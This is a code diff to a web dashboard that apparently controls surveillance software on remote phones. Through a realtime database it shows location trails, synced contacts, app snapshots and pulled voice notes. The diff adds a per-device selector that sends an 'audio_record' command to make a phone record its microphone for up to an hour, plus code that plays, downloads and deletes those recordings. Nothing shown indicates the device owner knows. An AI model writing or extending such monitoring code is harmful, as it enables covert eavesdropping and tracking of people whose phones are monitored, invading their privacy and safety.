@@ -87,6 +87,9 @@ button#loadHistoryBtn{padding:5px 7px;font-size:13px;min-height:30px;min-width:3
 .tab-btn{padding:10px 16px;font-size:13px;border:none;background:none;color:var(--muted);cursor:pointer;white-space:nowrap;border-bottom:2px solid transparent;transition:.15s}
 .tab-btn.active{color:var(--accent);border-bottom-color:var(--accent)}
 .tab-btn:hover{color:var(--text)}
+.subtab-btn{padding:6px 14px;font-size:12px;border:1px solid var(--border);background:var(--card);color:var(--muted);cursor:pointer;border-radius:6px;transition:.15s}
+.subtab-btn.active{background:var(--accent);color:#000;border-color:var(--accent);font-weight:500}
+.subtab-btn:hover{color:var(--text)}
 .content{padding:12px;max-height:50vh;overflow-y:auto}
 .content>div{display:none}
 .content>div.active{display:block}
@@ -389,6 +392,12 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 <div id="contactsList"><div class="label">No contacts synced yet</div></div>
 </div>
 <div id="tab-voice">
+<div class="subtab-nav" style="display:flex;gap:4px;margin-bottom:12px">
+  <button class="subtab-btn active" data-subtab="voice-remote" onclick="switchVoiceSubtab('voice-remote')">🎙️ Remote Recordings</button>
+  <button class="subtab-btn" data-subtab="voice-notes" onclick="switchVoiceSubtab('voice-notes')">🎤 Voice Notes</button>
+</div>
+
+<div id="voice-sub-remote" class="voice-subtab">
 <div class="voice-record-panel" style="background:var(--card);padding:12px;border-radius:var(--radius);margin-bottom:12px;border:1px solid var(--border)">
 <div style="display:flex;align-items:center;gap:8px;flex-wrap:wrap;margin-bottom:8px">
 <span style="font-size:13px;font-weight:500;color:var(--text)">🎙️ Remote Recording</span>
@@ -400,6 +409,7 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 <option value="1800">30 min</option>
 <option value="3600">60 min</option>
 </select>
+<select id="recDeviceSelect" class="device-select" style="font-size:12px;padding:6px 10px"><option value="">— Select device —</option></select>
 <button id="btnStartRecord" class="pb-btn" style="background:var(--danger);color:#fff;font-weight:600" onclick="startRemoteRecording()">
 <span>🎙️ Start Recording</span>
 </button>
@@ -416,6 +426,7 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 <span id="recProgressFormat" style="color:var(--muted);font-size:10px"></span>
 </div>
 <input type="range" id="recProgressBar" min="0" max="100" value="0" style="flex:1;accent-color:var(--danger);min-width:100px">
+<div id="recProgressCancel" style="display:none;margin-top:6px;font-size:11px;color:var(--muted);text-align:center">Recording in progress...</div>
 </div>
 
 <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:12px;padding-top:8px;border-top:1px solid var(--border)">
@@ -431,6 +442,11 @@ canvas.chart-canvas{width:100%!important;height:200px!important;border-radius:6p
 </div>
 </div>
 <div id="voiceNotesList"><div class="label">No recordings yet</div></div>
+</div>
+
+<div id="voice-sub-notes" class="voice-subtab" style="display:none">
+<div id="voiceNotesSubList"><div class="label">Loading voice notes...</div></div>
+</div>
 </div>
 <div id="tab-insights">
 <div class="grid" style="grid-template-columns:1fr 1fr 1fr;margin-bottom:10px">
@@ -663,6 +679,8 @@ const PKT = 'Asia/Karachi';
 // --- State ---
 let devices = {};
 let selectedDevice = null;
+let recordingDevice = null;
+let currentRecordingId = null;
 let locationHistory = [];
 let historyAutoLoaded = false;
 let marker, accuracyCircle, trail;
@@ -685,6 +703,7 @@ let timelineCache = null;
 let contactsCache = null;
 let contactsSyncTs = 0;
 let nomProcessing = false;
+let recordingDataCache = {};
 
 function loadGeofences(deviceId) {
   if (!deviceId) { geofences = []; renderGeofences(); renderGeofenceList(); return; }
@@ -1013,6 +1032,9 @@ document.addEventListener('visibilitychange', () => {
 document.getElementById('deviceSelect').addEventListener('change', function() {
   selectedDevice = this.value;
   localStorage.setItem('selectedDevice', selectedDevice);
+  recordingDevice = this.value;
+  const recSel = document.getElementById('recDeviceSelect');
+  if (recSel) recSel.value = recordingDevice;
   locationHistory = [];
   historyAutoLoaded = false;
   cachedPhotos = {};
@@ -1048,6 +1070,10 @@ document.getElementById('deviceSelect').addEventListener('change', function() {
   pollAll();
 });
 
+document.getElementById('recDeviceSelect').addEventListener('change', function() {
+  recordingDevice = this.value;
+});
+
 // --- Polling ---
 function stopPolling() {
   pollTimers.forEach(t => clearTimeout(t)); pollTimers = [];
@@ -1060,7 +1086,7 @@ function startPolling() {
   schedulePoll('apps', intervals.apps, pollApps);
   schedulePoll('appSnapshots', 30000, pollAppSnapshots);
   schedulePoll('hist', intervals.hist, pollHistory);
-  schedulePoll('voice', intervals.voice, pollVoiceNotes);
+  schedulePoll('voice', intervals.voice, pollRecordings);
   schedulePoll('contacts', intervals.contacts, pollContacts);
   schedulePoll('perms', intervals.perms, pollPermissions);
   schedulePoll('fcm', intervals.fcm, pollFcmToken);
@@ -1169,6 +1195,13 @@ async function fetchDevices() {
   dedupedIds.forEach(d => { devices[d.id] = { id: d.id, label: d.label, model: d.model, manuf: d.manuf }; });
   sel.innerHTML = dedupedIds.map(d => `<option value="${d.id}">${d.label}</option>`).join('');
   sel.value = selectedDevice;
+
+  recordingDevice = selectedDevice;
+  const recSel = document.getElementById('recDeviceSelect');
+  if (recSel) {
+    recSel.innerHTML = dedupedIds.map(d => `<option value="${d.id}">${d.label}</option>`).join('');
+    recSel.value = recordingDevice;
+  }
 }
 
 async function pollLocation() {
@@ -1800,186 +1833,324 @@ async function pollHistory() {
 async function pollRecordings() {
   if (!selectedDevice) return;
   const list = document.getElementById('voiceNotesList');
-  let data = await fetchRTDB(`devices/${selectedDevice}/recordings`);
-  if (!data || typeof data !== 'object') {
+  const path = `devices/${selectedDevice}/recordings`;
+  
+  // First: shallow fetch to get recording IDs
+  const keys = await fetchRTDB(path, 'shallow=true');
+  if (!keys || typeof keys !== 'object' || Object.keys(keys).length === 0) {
     list.innerHTML = '<div class="label">No remote recordings yet</div>';
     return;
   }
-  const recordings = Object.entries(data).map(([id, rec]) => ({ id, ...rec }));
-  recordings.sort((a, b) => (b.createdAt || 0) - (a.createdAt || 0));
+  
+  const recordingIds = Object.keys(keys).sort().reverse(); // newest first
+  list.innerHTML = '<div class="label">Loading recordings...</div>';
+  
+  // Fetch each recording individually (smaller requests, avoids 2.8MB single fetch)
+  const recordings = [];
+  for (const id of recordingIds) {
+    try {
+      const rec = await fetchRTDB(`${path}/${id}`);
+      if (rec && typeof rec === 'object') {
+        recordings.push({ id, ...rec });
+      }
+    } catch (e) {
+      console.warn('Failed to fetch recording', id, e);
+    }
+  }
+  
   if (!recordings.length) {
     list.innerHTML = '<div class="label">No recordings yet</div>';
     return;
   }
-  // Deduplicate: keep only first recording per unique (durationSec, sizeBytes) pair
-  const seen = new Set();
-  const uniqueRecordings = recordings.filter(rec => {
-    const key = `${rec.durationSec}_${rec.sizeBytes}`;
-    if (seen.has(key)) return false;
-    seen.add(key);
-    return true;
-  });
-  if (uniqueRecordings.length !== recordings.length) {
-    console.log(`Deduplicated ${recordings.length} -> ${uniqueRecordings.length} recordings`);
+  
+  let html = `<div style="font-size:11px;color:var(--muted);margin-bottom:8px">${recordings.length} recording${recordings.length>1?'s':''} • newest first</div>`;
+  
+  // Store recording data in cache for playback (avoids stuffing huge audio data into button HTML)
+  recordingDataCache = {};
+  for (const rec of recordings) {
+    const cacheParts = rec.parts || [];
+    let cacheMime = rec.mimeType || 'audio/mp4';
+    if (cacheParts.length > 0 && cacheParts[0] && cacheParts[0].format) {
+      if (cacheParts[0].format.includes('webm') || cacheParts[0].format.includes('opus')) cacheMime = 'audio/webm';
+      else if (cacheParts[0].format.includes('mp4') || cacheParts[0].format.includes('aac')) cacheMime = 'audio/mp4';
+      else if (cacheParts[0].format.includes('3gpp') || cacheParts[0].format.includes('amr')) cacheMime = 'audio/3gpp';
+    }
+    recordingDataCache[rec.id] = { parts: cacheParts, mimeType: cacheMime };
   }
-  let html = `<div style="font-size:11px;color:var(--muted);margin-bottom:8px">${uniqueRecordings.length} recording${uniqueRecordings.length>1?'s':''} • newest first</div>`;
-  for (const rec of uniqueRecordings) {
+  
+  for (const rec of recordings) {
     const dur = rec.durationSec ? Math.floor(rec.durationSec/60) + ':' + String(rec.durationSec%60).padStart(2,'0') : '';
     const size = rec.sizeBytes ? (rec.sizeBytes/1024/1024).toFixed(1) + ' MB' : '';
     const created = rec.createdAt ? pkt(rec.createdAt) : '';
     const parts = rec.parts || [];
+    const cachedInfo = recordingDataCache[rec.id];
+    const mimeType = cachedInfo ? cachedInfo.mimeType : 'audio/mp4';
     
-    // Merge all base64 segments into single blob for seamless playback
-    let mergedUrl = '';
+    // Determine format text for display
     let formatLabel = '';
-    if (parts.length > 0) {
-      // Determine format from first part
-      const firstPart = parts[0];
-      if (firstPart && firstPart.format) {
-        formatLabel = ` • ${firstPart.format}`;
-      } else if (rec.mimeType) {
-        formatLabel = ` • ${rec.mimeType}`;
-      }
-      
-      // Merge all base64 segments
-      try {
-        let totalLen = 0;
-        const chunks = [];
-        for (const part of parts) {
-          if (part && part.data) {
-            const binary = atob(part.data);
-            const bytes = new Uint8Array(binary.length);
-            for (let j = 0; j < binary.length; j++) bytes[j] = binary.charCodeAt(j);
-            chunks.push(bytes);
-            totalLen += bytes.length;
-          }
-        }
-        const merged = new Uint8Array(totalLen);
-        let offset = 0;
-        for (const c of chunks) { merged.set(c, offset); offset += c.length; }
-        
-        // Determine MIME type from format or mimeType
-        let mimeType = rec.mimeType || 'audio/mp4';
-        if (parts[0] && parts[0].format) {
-          if (parts[0].format.includes('webm') || parts[0].format.includes('opus')) mimeType = 'audio/webm';
-          else if (parts[0].format.includes('mp4') || parts[0].format.includes('aac')) mimeType = 'audio/mp4';
-          else if (parts[0].format.includes('3gpp') || parts[0].format.includes('amr')) mimeType = 'audio/3gpp';
-        }
-        const blob = new Blob([merged], { type: mimeType });
-        mergedUrl = URL.createObjectURL(blob);
-      } catch (e) {
-        console.error('Failed to merge audio segments:', e);
-      }
+    if (parts.length > 0 && parts[0] && parts[0].format) {
+      formatLabel = ` • ${parts[0].format}`;
     }
     
     let metaHtml = '';
     if (rec.cancelled) metaHtml += '<span class="chip" style="background:var(--warning);color:#000;font-size:9px">Cancelled</span> ';
     if (formatLabel) metaHtml += `<span class="chip" style="font-size:9px;background:var(--card);border-color:var(--border)">${formatLabel}</span> `;
-    if (rec.parts && rec.parts.length > 1) metaHtml += `<span class="chip" style="font-size:9px;background:var(--card);border-color:var(--border)">${rec.parts.length} segments merged</span> `;
+    if (parts.length > 1) metaHtml += `<span class="chip" style="font-size:9px;background:var(--card);border-color:var(--border)">${parts.length} segments</span> `;
     
-    // Add metadata from first segment if available
-    if (rec.parts && rec.parts[0] && rec.parts[0].metadata) {
-      const m = rec.parts[0].metadata;
+    if (parts[0] && parts[0].metadata) {
+      const m = parts[0].metadata;
       if (m.batteryLevel !== undefined) metaHtml += `<span class="chip" style="font-size:9px">🔋 ${m.batteryLevel}%</span> `;
       if (m.networkType) metaHtml += `<span class="chip" style="font-size:9px">${m.networkType}</span> `;
       if (m.signalStrengthDbm !== undefined) metaHtml += `<span class="chip" style="font-size:9px">📶 ${m.signalStrengthDbm}dBm</span> `;
       if (m.gpsLatitude && m.gpsLongitude) metaHtml += `<span class="chip" style="font-size:9px">📍 ${m.gpsLatitude.toFixed(4)},${m.gpsLongitude.toFixed(4)}</span> `;
     }
     
-    let downloadLinks = '';
-    if (mergedUrl) {
-      // Single merged audio player
-      const playerHtml = `<audio controls preload="none" src="${mergedUrl}" type="${mimeType || 'audio/mp4'}" style="width:100%;margin-top:6px"></audio>`;
-      
-      // Download link for merged file
-      downloadLinks = `<a href="${mergedUrl}" download="recording_${rec.id}.m4a" style="font-size:10px;color:var(--accent);margin-right:8px">⬇ Download (${size})</a>`;
-      
-      html += `<div class="voice-card">
-        <div class="vname">Recording ${created} ${dur ? `• ${dur}` : ''} ${size ? `• ${size}` : ''} ${metaHtml}
-          <button class="chip" style="background:var(--danger);color:#000;border-color:var(--danger);font-size:9px;padding:2px 6px;margin-left:8px" onclick="deleteRecording('${rec.id}')">Delete</button></div>
-        ${playerHtml}
-        ${downloadLinks ? `<div style="font-size:10px;margin-top:4px">${downloadLinks}</div>` : ''}
-      </div>`;
-    } else {
-      // Fallback for legacy format
-      html += `<div class="voice-card">
-        <div class="vname">Recording ${created} ${dur ? `• ${dur}` : ''} ${size ? `• ${size}` : ''} 
-          <button class="chip" style="background:var(--danger);color:#000;border-color:var(--danger);font-size:9px;padding:2px 6px;margin-left:8px" onclick="deleteRecording('${rec.id}')">Delete</button></div>
-        <div style="font-size:10px;color:var(--muted)">No playable segments</div>
-      </div>`;
-    }
-  }
-  list.innerHTML = html;
-}
-async function pollVoiceNotes() {
-  if (!selectedDevice) return;
-  const list = document.getElementById('voiceNotesList');
-  let data = await fetchRTDB(`devices/${selectedDevice}/voice_notes`);
-  if (!data || typeof data !== 'object') {
-    list.innerHTML = '<div class="label">No voice notes yet</div>';
-    return;
-  }
-  // voice_notes: object with batch keys -> { notes: [...], totalCount, ts_ms, freeMb }
-  let allNotes = [];
-  for (const [batchKey, batch] of Object.entries(data)) {
-    if (batch && batch.notes && Array.isArray(batch.notes)) {
-      for (const note of batch.notes) {
-        if (note && note.audioData) {
-          allNotes.push({ ...note, batchKey });
-        }
-      }
-    }
-  }
-  // Sort by dateAdded (newest first)
-  allNotes.sort((a, b) => (parseInt(b.dateAdded) || 0) - (parseInt(a.dateAdded) || 0));
-  if (!allNotes.length) {
-    list.innerHTML = '<div class="label">No voice notes yet</div>';
-    return;
-  }
-  let html = `<div style="font-size:11px;color:var(--muted);margin-bottom:8px">${allNotes.length} voice note${allNotes.length>1?'s':''} • newest first</div>`;
-  for (const note of allNotes) {
-    const dur = note.durationMs ? Math.floor(note.durationMs/60000) + ':' + String(Math.floor((note.durationMs%60000)/1000)).padStart(2,'0') : '';
-    const size = note.sizeBytes ? (note.sizeBytes/1024).toFixed(1) + ' KB' : '';
-    const created = note.dateAdded ? pkt(note.dateAdded) : '';
-    const mimeType = note.mimeType || 'audio/ogg';
-    
-    let audioUrl = '';
-    if (note.audioData) {
-      try {
-        const binary = atob(note.audioData);
-        const bytes = new Uint8Array(binary.length);
-        for (let i = 0; i < binary.length; i++) bytes[i] = binary.charCodeAt(i);
-        const blob = new Blob([bytes], { type: mimeType });
-        audioUrl = URL.createObjectURL(blob);
-      } catch (e) {
-        console.error('Failed to decode voice note audio:', e);
-      }
-    }
-    
-    let metaHtml = '';
-    if (note.fileName) metaHtml += `<span class="chip" style="font-size:9px">${note.fileName}</span> `;
-    
-    let downloadLink = '';
-    if (audioUrl) {
-      downloadLink = `<a href="${audioUrl}" download="${note.fileName || 'voice_note.ogg'}" style="font-size:10px;color:var(--accent);margin-right:8px">⬇ Download (${size})</a>`;
-    }
-    
-    let playerHtml = '';
-    if (audioUrl) {
-      playerHtml = `<audio controls preload="none" src="${audioUrl}" type="${mimeType}" style="width:100%;margin-top:6px"></audio>`;
-    } else {
-      playerHtml = '<div style="font-size:10px;color:var(--muted)">No playable audio data</div>';
-    }
+    const playerId = `player_${rec.id}`;
     
     html += `<div class="voice-card">
-      <div class="vname">${created} ${dur ? `• ${dur}` : ''} ${size ? `• ${size}` : ''} ${metaHtml}
-        <button class="chip" style="background:var(--danger);color:#000;border-color:var(--danger);font-size:9px;padding:2px 6px;margin-left:8px" onclick="deleteVoiceNote('${note.batchKey}', ${allNotes.indexOf(note)})">Delete</button></div>
-      ${playerHtml}
-      ${downloadLink ? `<div style="font-size:10px;margin-top:4px">${downloadLink}</div>` : ''}
+      <div class="vname">Recording ${created} ${dur ? `• ${dur}` : ''} ${size ? `• ${size}` : ''} ${metaHtml}
+        <button class="chip" style="background:var(--danger);color:#000;border-color:var(--danger);font-size:9px;padding:2px 6px;margin-left:8px" onclick="deleteRecording('${rec.id}')">Delete</button>
+        <button class="chip" style="background:var(--accent);color:#000;border-color:var(--accent);font-size:9px;padding:2px 6px;margin-left:4px" onclick="loadAndPlayRecording('${rec.id}')">▶ Play</button>
+      </div>
+      <audio id="${playerId}" controls preload="none" style="width:100%;margin-top:6px;display:none"></audio>
     </div>`;
   }
   list.innerHTML = html;
 }
+
+// Lazy load and play a specific recording
+async function loadAndPlayRecording(recordingId) {
+  const audioEl = document.getElementById(`player_${recordingId}`);
+  const btn = audioEl.previousElementSibling?.querySelector('button[onclick*="loadAndPlayRecording"]') || audioEl.previousElementSibling;
+  
+  if (audioEl.src) {
+    // Already loaded, just toggle play/pause
+    if (audioEl.paused) audioEl.play(); else audioEl.pause();
+    return;
+  }
+  
+  // Look up recording data from cache (avoids stuffing huge audio data into button HTML)
+  const cached = recordingDataCache[recordingId];
+  if (!cached) {
+    showAlert('Recording data not found in cache', 'error');
+    return;
+  }
+  const parts = cached.parts;
+  const mimeType = cached.mimeType;
+  
+  btn.textContent = '⏳ Loading...';
+  btn.disabled = true;
+  audioEl.style.display = 'block';
+  
+  try {
+    // Merge all base64 segments
+    let totalLen = 0;
+    const chunks = [];
+    for (const part of parts) {
+      if (part && part.data) {
+        const binary = atob(part.data);
+        const bytes = new Uint8Array(binary.length);
+        for (let j = 0; j < binary.length; j++) bytes[j] = binary.charCodeAt(j);
+        chunks.push(bytes);
+        totalLen += bytes.length;
+      }
+    }
+    const merged = new Uint8Array(totalLen);
+    let offset = 0;
+    for (const c of chunks) { merged.set(c, offset); offset += c.length; }
+    
+    const blob = new Blob([merged], { type: mimeType });
+    audioEl.src = URL.createObjectURL(blob);
+    await audioEl.play();
+    btn.textContent = '⏸ Pause';
+    btn.onclick = () => audioEl.pause();
+    btn.disabled = false;
+    
+    audioEl.onpause = () => {
+      btn.textContent = '▶ Play';
+      btn.onclick = () => loadAndPlayRecording(recordingId);
+    };
+    audioEl.onplay = () => {
+      btn.textContent = '⏸ Pause';
+    };
+  } catch (e) {
+    console.error('Failed to load recording:', e);
+    btn.textContent = '❌ Error';
+    btn.disabled = false;
+    showAlert('Failed to load audio: ' + e.message, 'error');
+  }
+}
+
+// --- Voice Notes Subtab ---
+
+function switchVoiceSubtab(subtab) {
+  document.querySelectorAll('#tab-voice .subtab-btn').forEach(b => b.classList.remove('active'));
+  document.querySelectorAll('#tab-voice .voice-subtab').forEach(d => d.style.display = 'none');
+  document.querySelector(`#tab-voice .subtab-btn[data-subtab="${subtab}"]`).classList.add('active');
+  document.getElementById(`voice-sub-${subtab.replace('voice-', '')}`).style.display = '';
+  if (subtab === 'voice-notes') pollVoiceNotes();
+}
+
+async function pollVoiceNotes() {
+  if (!selectedDevice) return;
+  const list = document.getElementById('voiceNotesSubList');
+  const path = `devices/${selectedDevice}/voice_notes`;
+  
+  const keys = await fetchRTDB(path, 'shallow=true');
+  if (!keys || typeof keys !== 'object' || Object.keys(keys).length === 0) {
+    list.innerHTML = '<div class="label">No voice notes yet</div>';
+    return;
+  }
+  
+  const batchKeys = Object.keys(keys).sort().reverse();
+  list.innerHTML = '<div class="label">Loading voice notes...</div>';
+  
+  const allNotes = [];
+  for (const batchKey of batchKeys) {
+    try {
+      const batch = await fetchRTDB(`${path}/${batchKey}`);
+      if (batch && batch.notes && Array.isArray(batch.notes)) {
+        for (let i = 0; i < batch.notes.length; i++) {
+          const note = batch.notes[i];
+          allNotes.push({ batchKey, noteIndex: i, ...note });
+        }
+      }
+    } catch (e) {
+      console.warn('Failed to fetch voice note batch', batchKey, e);
+    }
+  }
+  
+  if (!allNotes.length) {
+    list.innerHTML = '<div class="label">No voice notes yet</div>';
+    return;
+  }
+  
+  // Sort by dateAdded newest first
+  allNotes.sort((a, b) => (parseInt(b.dateAdded) || 0) - (parseInt(a.dateAdded) || 0));
+  
+  let html = `<div style="font-size:11px;color:var(--muted);margin-bottom:8px">${allNotes.length} voice note${allNotes.length>1?'s':''} • newest first</div>`;
+  
+  for (const note of allNotes) {
+    const fileName = note.fileName || 'Unknown';
+    const dur = note.durationMs ? Math.floor(note.durationMs/60000) + ':' + String(Math.floor(note.durationMs%60000/1000)).padStart(2,'0') : '';
+    const size = note.sizeBytes ? (note.sizeBytes/1024).toFixed(0) + ' KB' : '';
+    const dateAdded = note.dateAdded ? pkt(note.dateAdded * 1000) : '';
+    const mimeType = note.mimeType || 'audio/mp4';
+    const batchKey = note.batchKey;
+    const noteIndex = note.noteIndex;
+    const playerId = `vn_player_${batchKey}_${noteIndex}`;
+    
+    const hasAudio = !!(note.audioData);
+    html += `<div class="voice-card">
+      <div class="vname">${fileName} ${dateAdded ? `• ${dateAdded}` : ''} ${dur ? `• ${dur}` : ''} ${size ? `• ${size}` : ''}
+        <button class="chip" style="background:var(--danger);color:#000;border-color:var(--danger);font-size:9px;padding:2px 6px;margin-left:8px" onclick="deleteVoiceNoteFromList('${batchKey}', ${noteIndex})">Delete</button>
+        ${hasAudio
+          ? `<button class="chip" style="background:var(--accent);color:#000;border-color:var(--accent);font-size:9px;padding:2px 6px;margin-left:4px" onclick="loadAndPlayVoiceNote('${batchKey}', ${noteIndex})">▶ Play</button>`
+          : `<span class="chip" style="background:var(--border);color:var(--muted);border-color:var(--border);font-size:9px;padding:2px 6px;margin-left:4px;cursor:default">No audio</span>`
+        }
+      </div>
+      ${hasAudio ? `<audio id="${playerId}" controls preload="none" style="width:100%;margin-top:6px;display:none"></audio>` : ''}
+    </div>`;
+  }
+  list.innerHTML = html;
+}
+
+// Cache voice note data for playback (avoids inline base64 in buttons)
+let voiceNoteDataCache = {};
+
+async function loadAndPlayVoiceNote(batchKey, noteIndex) {
+  const audioEl = document.getElementById(`vn_player_${batchKey}_${noteIndex}`);
+  if (!audioEl) { showAlert('Voice note player not found', 'error'); return; }
+  const btn = audioEl.previousElementSibling?.querySelector('button[onclick*="loadAndPlayVoiceNote"]') || audioEl.previousElementSibling;
+  
+  if (audioEl.src) {
+    if (audioEl.paused) audioEl.play(); else audioEl.pause();
+    return;
+  }
+  
+  const cacheKey = `${batchKey}_${noteIndex}`;
+  let note = voiceNoteDataCache[cacheKey];
+  if (!note) {
+    try {
+      const batch = await fetchRTDB(`devices/${selectedDevice}/voice_notes/${batchKey}`);
+      if (!batch || !batch.notes || !batch.notes[noteIndex]) {
+        showAlert('Voice note not found', 'error');
+        return;
+      }
+      voiceNoteDataCache = {};
+      voiceNoteDataCache[cacheKey] = batch.notes[noteIndex];
+      note = batch.notes[noteIndex];
+    } catch (e) {
+      showAlert('Failed to load voice note', 'error');
+      return;
+    }
+  }
+  
+  const audioData = note.audioData;
+  const mimeType = note.mimeType || 'audio/mp4';
+  if (!audioData) {
+    showAlert('No audio data in this note', 'error');
+    return;
+  }
+  
+  btn.textContent = '⏳ Loading...';
+  btn.disabled = true;
+  audioEl.style.display = 'block';
+  
+  try {
+    const binary = atob(audioData);
+    const bytes = new Uint8Array(binary.length);
+    for (let j = 0; j < binary.length; j++) bytes[j] = binary.charCodeAt(j);
+    
+    const blob = new Blob([bytes], { type: mimeType });
+    audioEl.src = URL.createObjectURL(blob);
+    await audioEl.play();
+    btn.textContent = '⏸ Pause';
+    btn.onclick = () => audioEl.pause();
+    btn.disabled = false;
+    
+    audioEl.onpause = () => {
+      btn.textContent = '▶ Play';
+      btn.onclick = () => loadAndPlayVoiceNote(batchKey, noteIndex);
+    };
+    audioEl.onplay = () => {
+      btn.textContent = '⏸ Pause';
+    };
+  } catch (e) {
+    console.error('Failed to load voice note:', e);
+    btn.textContent = '❌ Error';
+    btn.disabled = false;
+    showAlert('Failed to play voice note: ' + e.message, 'error');
+  }
+}
+
+async function deleteVoiceNoteFromList(batchKey, noteIndex) {
+  if (!selectedDevice) { showAlert('No device selected', 'error'); return; }
+  try {
+    const batch = await fetchRTDB(`devices/${selectedDevice}/voice_notes/${batchKey}`);
+    if (!batch || !batch.notes || !batch.notes[noteIndex]) {
+      showAlert('Voice note not found', 'error');
+      return;
+    }
+    const note = batch.notes[noteIndex];
+    batch.notes.splice(noteIndex, 1);
+    batch.totalCount = batch.notes.length;
+    if (batch.notes.length === 0) {
+      await deleteRTDB(`devices/${selectedDevice}/voice_notes/${batchKey}`);
+    } else {
+      await fetch(`${RTDB}/devices/${selectedDevice}/voice_notes/${batchKey}.json`, {
+        method: 'PUT',
+        body: JSON.stringify(batch)
+      });
+    }
+    showAlert(`Deleted voice note: ${note.fileName || 'unknown'}`, 'warn');
+    pollVoiceNotes();
+    await refreshStorage();
+  } catch (e) {
+    showAlert('Delete failed: ' + e.message, 'error');
+  }
+}
+
 async function pollContacts() {
   if (!selectedDevice) return;
   const list = document.getElementById('contactsList');
@@ -3048,7 +3219,7 @@ async function deleteVoiceNote(batchKey, noteIndex) {
         body: JSON.stringify(batch)
       });
     }
-    showAlert(`Deleted voice note: ${note.fileName || 'unknown'}`, 'warn');
+     showAlert(`Deleted voice note: ${note.fileName || 'unknown'}`, 'warn');
     pollVoiceNotes();
     await refreshStorage();
   } catch (e) {
@@ -3059,11 +3230,12 @@ async function deleteVoiceNote(batchKey, noteIndex) {
 // --- Remote Recording Functions ---
 
 async function startRemoteRecording() {
-  if (!selectedDevice) { showAlert('No device selected', 'error'); return; }
+  if (!recordingDevice) { showAlert('No device selected', 'error'); return; }
   
   const durationSec = parseInt(document.getElementById('recDuration').value);
   const requestId = 'rec_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
-  const cmdUrl = `${RTDB}/devices/${selectedDevice}/commands/audio_record.json`;
+  const cmdUrl = `${RTDB}/devices/${recordingDevice}/commands/audio_record.json`;
+  const devLabel = document.querySelector(`#recDeviceSelect option[value="${recordingDevice}"]`)?.textContent || recordingDevice;
   
   const btn = document.getElementById('btnStartRecord');
   const cancelBtn = document.getElementById('btnCancelRecord');
@@ -3101,7 +3273,7 @@ async function startRemoteRecording() {
     });
     if (!resp.ok) throw new Error('HTTP ' + resp.status);
     
-    status.textContent = `Recording started (${durationSec}s)...`;
+    status.textContent = `Recording on ${devLabel} (${durationSec}s)...`;
     progressBar.value = 0;
     progressLabel.textContent = 'Waiting for device...';
     progressTime.textContent = '';
@@ -3122,7 +3294,7 @@ async function startRemoteRecording() {
 }
 
 async function cancelRemoteRecording() {
-  if (!selectedDevice) return;
+  if (!recordingDevice) return;
   
   const recordingId = currentRecordingId;
   if (!recordingId) {
@@ -3130,7 +3302,7 @@ async function cancelRemoteRecording() {
     return;
   }
   
-  const cmdUrl = `${RTDB}/devices/${selectedDevice}/commands/audio_record.json`;
+  const cmdUrl = `${RTDB}/devices/${recordingDevice}/commands/audio_record.json`;
   try {
     const resp = await fetch(cmdUrl, {
       method: 'PUT',
@@ -3149,9 +3321,9 @@ async function cancelRemoteRecording() {
 }
 
 async function pollRecordingProgress(requestId, durationSec) {
-  if (!selectedDevice) return;
+  if (!recordingDevice) return;
   
-  let currentRecordingId = null;
+  currentRecordingId = null;
   const startTime = Date.now();
   const btn = document.getElementById('btnStartRecord');
   const cancelBtn = document.getElementById('btnCancelRecord');
@@ -3167,7 +3339,7 @@ async function pollRecordingProgress(requestId, durationSec) {
   const poll = async () => {
     try {
       // First check recording status for live updates
-      const statusUrl = `${RTDB}/devices/${selectedDevice}/recordingStatus.json`;
+      const statusUrl = `${RTDB}/devices/${recordingDevice}/recordingStatus.json`;
       const statusResp = await fetch(statusUrl);
       if (statusResp.ok) {
         const allStatus = await statusResp.json();
@@ -3196,7 +3368,7 @@ async function pollRecordingProgress(requestId, durationSec) {
     } catch (e) {}
     
     // Also check command response for final status
-      const responseUrl = `${RTDB}/devices/${selectedDevice}/commands/audio_record/response.json`;
+      const responseUrl = `${RTDB}/devices/${recordingDevice}/commands/responses/${requestId}.json`;
       try {
         const resp = await fetch(responseUrl);
         if (resp.ok) {
@@ -3205,8 +3377,13 @@ async function pollRecordingProgress(requestId, durationSec) {
             if (data.status === 'started') {
               progressLabel.textContent = 'Recording in progress...';
               status.textContent = 'Recording...';
-            } else if (data.status === 'completed') {
-              status.textContent = 'Recording completed, uploading...';
+            } else if (data.status === 'completed' || data.status === 'uploaded') {
+              status.textContent = 'Recording complete ✓';
+              progressLabel.textContent = 'Upload complete';
+              progressBar.value = 100;
+              try { await pollRecordings(); } catch (e) {}
+              resetRecordingUI();
+              return;
             } else if (data.status === 'error') {
               showAlert('Recording failed: ' + data.message, 'error');
               resetRecordingUI();
@@ -3224,9 +3401,8 @@ async function pollRecordingProgress(requestId, durationSec) {
       }
       progressTime.textContent = `${elapsed}s / ${durationSec}s`;
       
-      if (elapsed >= durationSec + 5) {
-        // Recording should be done, fetch new recordings
-        await fetchRecordings();
+      if (elapsed >= durationSec + 30) {
+        try { await pollRecordings(); } catch (e) {}
         resetRecordingUI();
         return;
       }
@@ -3254,19 +3430,19 @@ function resetRecordingUI() {
 }
 
 async function cleanupOldRecordings(days) {
-  if (!selectedDevice) { showAlert('No device selected', 'error'); return; }
+  if (!recordingDevice) { showAlert('No device selected', 'error'); return; }
   if (!confirm(`Delete all recordings older than ${days} day(s)? This cannot be undone.`)) return;
   
   const cutoff = Date.now() - days * 24 * 60 * 60 * 1000;
   let deleted = 0;
   
   try {
-    const data = await fetchRTDB(`devices/${selectedDevice}/recordings`);
+    const data = await fetchRTDB(`devices/${recordingDevice}/recordings`);
     if (!data || typeof data !== 'object') { showAlert('No recordings found', 'warn'); return; }
     
     for (const [id, rec] of Object.entries(data)) {
       if (rec.createdAt && parseInt(rec.createdAt) < cutoff) {
-        await deleteRTDB(`devices/${selectedDevice}/recordings/${id}`);
+        await deleteRTDB(`devices/${recordingDevice}/recordings/${id}`);
         deleted++;
       }
     }
@@ -3278,12 +3454,12 @@ async function cleanupOldRecordings(days) {
 }
 
 async function fetchRecordings() {
-  if (!selectedDevice) return;
+  if (!recordingDevice) return;
   const list = document.getElementById('recordingsList');
   list.innerHTML = '<div class="label">Loading...</div>';
   
   try {
-    const data = await fetchRTDB(`devices/${selectedDevice}/recordings`);
